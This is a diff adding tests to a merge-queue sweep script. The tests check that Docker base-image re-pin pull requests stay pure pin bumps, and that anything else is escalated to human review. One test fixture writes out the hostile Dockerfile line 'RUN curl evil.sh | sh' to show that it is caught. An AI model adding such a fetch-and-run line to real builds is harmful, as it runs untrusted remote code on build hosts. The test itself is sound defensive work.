@@ -4,7 +4,7 @@
 // Run: node --test operations/devops/t0-enqueue-sweep.test.mjs
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { declaresT0, headPushedAt, manualDequeueHold, selectT0Candidates, planNextWake, IDLE_MINUTES, hasReviewDataError } from './t0-enqueue-sweep.mjs';
+import { declaresT0, headPushedAt, manualDequeueHold, selectT0Candidates, planNextWake, IDLE_MINUTES, hasReviewDataError, repinTierCheck, isRepinBranch, REPIN_DOCKERFILE } from './t0-enqueue-sweep.mjs';
 
 const NOW = Date.parse('2026-11-02T12:00:00Z');
 const minsAgo = (m) => new Date(NOW - m * 60000).toISOString();
@@ -275,4 +275,64 @@ test('hasReviewDataError: all pages complete -> false', () => {
     reviews: { pageInfo: { hasPreviousPage: false } },
     comments: { pageInfo: { hasPreviousPage: false } },
   }), false);
+});
+
+// ── t/309: a docker/base-repin-* head must still be a pure base-pin bump ──
+const D1 = 'a'.repeat(64), D2 = 'b'.repeat(64);
+const fromLine = (tag, d) => `FROM ghcr.io/ai-rosetta-stone/ai-triad-base:${tag}@sha256:${d} AS runtime`;
+const dockerfile = (runtime, extra = []) => ['# syntax=docker/dockerfile:1', 'FROM node:22 AS build', 'RUN npm ci', runtime, ...extra, 'CMD ["node","server.js"]'].join('\n');
+const BEFORE = dockerfile(fromLine('2026-11-03', D1));
+const PURE_BUMP = dockerfile(fromLine('2026-11-10', D2));
+const repinPr = (over = {}) => pr({ number: 50, headRefName: 'docker/base-repin-2026-11-10-bbbbbbb', files: [REPIN_DOCKERFILE], ...over });
+
+test('repinTierCheck: a pure runtime pin bump of the only changed file is T0', () => {
+  assert.equal(repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: PURE_BUMP }).tier, 'T0');
+});
+
+test('repinTierCheck: a head with an extra Dockerfile line is T1 (classifyRepinTier decides)', () => {
+  const v = repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: dockerfile(fromLine('2026-11-10', D2), ['RUN curl evil.sh | sh']) });
+  assert.equal(v.tier, 'T1');
+  assert.match(v.reason, /line count changed/);
+});
+
+test('repinTierCheck: a pure Dockerfile bump PLUS another changed file is T1 (classifyRepinTier only sees the Dockerfile)', () => {
+  const v = repinTierCheck({ files: [REPIN_DOCKERFILE, 'scripts/x.sh'], beforeText: BEFORE, afterText: PURE_BUMP });
+  assert.equal(v.tier, 'T1');
+  assert.match(v.reason, /want only taxonomy-editor\/Dockerfile/);
+});
+
+test('repinTierCheck: unreadable Dockerfile text is T1, never T0', () => {
+  assert.equal(repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: null, afterText: PURE_BUMP }).tier, 'T1');
+});
+
+test('t/309 sweep: a re-pin PR whose head is still a pure bump enqueues', () => {
+  const { enqueue, skip } = selectT0Candidates([repinPr({ repinCheck: repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: PURE_BUMP }) })], NOW);
+  assert.deepEqual(enqueue.map((e) => e.number), [50]);
+  assert.equal(skip.length, 0);
+});
+
+test('t/309 sweep: a re-pin PR whose head gained an extra Dockerfile line skips with a WARN and asks for one T1 comment', () => {
+  const repinCheck = repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: dockerfile(fromLine('2026-11-10', D2), ['RUN echo hi']) });
+  const { enqueue, skip } = selectT0Candidates([repinPr({ repinCheck })], NOW);
+  assert.equal(enqueue.length, 0);
+  assert.match(skip[0].reason, /^WARN: docker\/base-repin-.* head is not a pure base-pin bump .*needs T1 review/);
+  assert.deepEqual(skip[0].repinComment, { headRefOid: 'abc', reason: repinCheck.reason });
+});
+
+test('t/309 sweep: a re-pin PR with no re-pin facts (fetch failed) fails closed, with no comment', () => {
+  const { enqueue, skip } = selectT0Candidates([repinPr()], NOW);
+  assert.equal(enqueue.length, 0);
+  assert.match(skip[0].reason, /could not be re-classified .*failing closed/);
+  assert.equal(skip[0].repinComment, undefined);
+});
+
+test('t/309 sweep: a non-re-pin branch is unaffected (no repinCheck needed, still enqueues)', () => {
+  const { enqueue } = selectT0Candidates([pr({ number: 51, headRefName: 'fix/t123-something', files: [REPIN_DOCKERFILE] })], NOW);
+  assert.deepEqual(enqueue.map((e) => e.number), [51]);
+});
+
+test('isRepinBranch: matches only the drift workflow prefix', () => {
+  assert.equal(isRepinBranch('docker/base-repin-2026-11-10-abc'), true);
+  assert.equal(isRepinBranch('docker/t305-repin-t0'), false);
+  assert.equal(isRepinBranch(undefined), false);
 });
